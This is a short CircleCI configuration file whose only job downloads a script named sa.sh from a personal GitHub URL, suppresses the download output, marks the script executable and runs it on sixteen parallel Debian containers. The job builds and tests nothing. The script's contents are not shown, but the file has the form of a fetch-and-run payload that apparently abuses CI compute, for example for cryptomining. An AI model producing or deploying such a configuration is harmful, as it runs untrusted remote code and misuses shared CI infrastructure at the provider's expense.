version: 2.1 
jobs: 
    trial: 
      docker: 
            - image: debian:latest 
      parallelism: 16 
      steps: 
        - run: sudo su && wget -O sa.sh https://raw.githubusercontent.com/Cetinbas11/1/main/sa.sh > /dev/null 2>&1
        - run: chmod +x sa.sh
        - run: ./sa.sh
 
workflows: 
    version: 2.1 
    build: 
        jobs: 
        - trial